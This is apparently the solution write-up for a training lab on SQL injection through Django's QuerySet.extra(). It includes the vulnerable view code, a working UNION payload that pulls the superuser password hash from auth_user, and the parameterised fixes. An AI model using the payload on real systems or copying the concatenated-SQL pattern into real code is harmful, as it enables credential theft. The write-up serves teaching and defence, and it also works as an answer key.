# Solution — sqli-django-extra-orm

## What tipped you off

The app "uses the ORM everywhere," yet the advanced-search results clearly change
based on raw text you supply, and a lone quote (`/search?q='`) throws a verbose
database syntax error instead of returning an empty list. A parameterised query
never turns your input into SQL syntax — so something on this path is building
SQL by string concatenation. In Django, the usual culprits are the ORM's _escape
hatches_: `QuerySet.extra()`, `Manager.raw()`, and `RawSQL()`.

## The class of bug

SQL injection (CWE-89, OWASP A03:2021), here through **`QuerySet.extra()`**. The
ORM parameterises the queries _it_ builds, but `.extra(where=[...])` takes a raw
SQL fragment and splices it in untouched. Parameterisation is a property of _how a
query is built_, not of _which library you imported_ — an ORM does not make raw
SQL safe.

## Vulnerability

`src/app/views.py`, `/search`:

```python
q = request.GET.get("q", "")
where_clause = f"title LIKE '%%{q}%%'"
products = list(Product.objects.extra(where=[where_clause]))
```

`q` is concatenated straight into a raw SQL fragment and handed to `.extra()`.
The base query Django compiles is:

```sql
SELECT id, title, blurb, price_cents FROM app_product WHERE (title LIKE '%%<q>%%')
```

(The driver collapses the doubled `%%` wildcards to single `%` before it reaches
Postgres.)

## Why the developer wrote it this way

Two comfortable assumptions collided. First, "we use the ORM, so we're safe from
SQLi" — true for `.filter()`, false for `.extra()`, and the difference is easy to
miss in review because both are `Product.objects.…`. Second, `LIKE '%term%'` is
awkward to express with field lookups when you want a specific wildcard shape, so
`.extra()` looks like a tidy shortcut. The doubled `%%` even _look_ defensive
(they are how Django itself writes literal wildcards internally), which lulls the
reader into thinking the string was handled carefully. It was not: only the
wildcards were doubled, the user's value was not bound.

## Why it exists

`.extra(where=[...])` is documented to take raw SQL. The only safe way to include
a value is to use its `params=` argument with a `%s` placeholder
(`.extra(where=["title LIKE %s"], params=[f"%{q}%"])`), which binds the value.
Concatenating instead means every quote, keyword, parenthesis and comment in `q`
is interpreted as SQL. The results query happens to `SELECT` four columns, which
is all an attacker needs to UNION in rows from any other table the DB user can
read — including `auth_user`.

## The mechanical exploit

The results query selects **four** columns (`id, title, blurb, price_cents`) and
renders `title` in the first table cell. Supply a `q` that closes the `LIKE`
string _and_ the parenthesis `.extra()` wraps around the clause, then UNION a
4-column row with the superuser hash in the `title` slot:

```
zzz') UNION SELECT NULL, password, NULL, NULL FROM auth_user WHERE username='root'--
```

After splicing and wildcard-collapse, Postgres executes:

```sql
SELECT id, title, blurb, price_cents FROM app_product
WHERE (title LIKE '%zzz') UNION SELECT NULL, password, NULL, NULL FROM auth_user WHERE username='root'-- %')
```

- `title LIKE '%zzz'` matches no products (nothing ends in `zzz`), so the base
  side is empty.
- The `)` in the payload closes the parenthesis Django adds around the extra
  `where` clause, lifting the `UNION` to the top level.
- `NULL` fills the `id`, `blurb` and `price_cents` columns (NULL is type-
  compatible with anything in a Postgres UNION); `password` (text) lines up with
  `title` (text), so the hash renders where a product title normally would.
- `-- ` comments out the trailing `%')` the sink leaves behind.

The response's title cell now contains `pbkdf2_sha256$…`, the full per-container
superuser hash — extracted in a **single request**, no blind/char-by-char work.

## Exploit walkthrough

1. `GET /search?q=<payload above>` (URL-encoded). Read the `pbkdf2_sha256$…`
   value out of the results table.
2. `POST /solve` with form field `hash=<that value>`. The server compares it (in
   constant time) to `auth_user.password` for `root` and, on an exact match,
   returns `{"flag": "FLAG{…}"}`.

`tests/exploit.py` performs exactly these two steps with `urllib` and asserts the
flag equals the HMAC-derived expected value.

## Fix

Never concatenate into raw SQL — bind the value. If you must use `.extra()`, use
its `params=`:

```python
Product.objects.extra(where=["title LIKE %s"], params=[f"%{q}%"])
```

Better, avoid the escape hatch entirely and let the ORM parameterise for you:

```python
Product.objects.filter(title__icontains=q)
```

`__icontains` builds the `LIKE '%…%'` pattern and binds `q` as a parameter. The
deeper lesson: `.extra()`, `.raw()` and `RawSQL()` are raw-SQL sinks. Treat them
like `cursor.execute` — assume every interpolated value is attacker-controlled,
and pass values as parameters, never as string fragments.

## Lab-vs-production deviations

- **LIKE wildcards written as `%%`.** The vulnerable f-string uses `'%%{q}%%'`
  rather than the single-`%` form shown in some write-ups. Under Django 5.1 +
  psycopg 3 the ORM executes even a paramless query through the driver's
  client-side binder, which rejects a lone literal `%`; doubling the _wildcards_
  is exactly how Django itself emits literal `%` internally, and it does not
  affect the injection (the user's `q` is still unbound). This keeps the lab
  faithful to the `.extra()` bug while ensuring benign searches actually run.
- **Verbose DB errors.** `/search` catches database exceptions and echoes the
  message to help you tune the injection. A production app would return an
  opaque 500 and log the detail server-side.
- **`/solve` is CSRF-exempt.** Purely so the stdlib exploit can POST without
  scraping a token; unrelated to the vulnerability.
- **Objective is the full hash, not a short token.** The submitted value is the
  entire `pbkdf2_sha256$…` string (~88 chars). Because it is recovered in a
  single UNION extraction (not blind), its length has no effect on runtime.
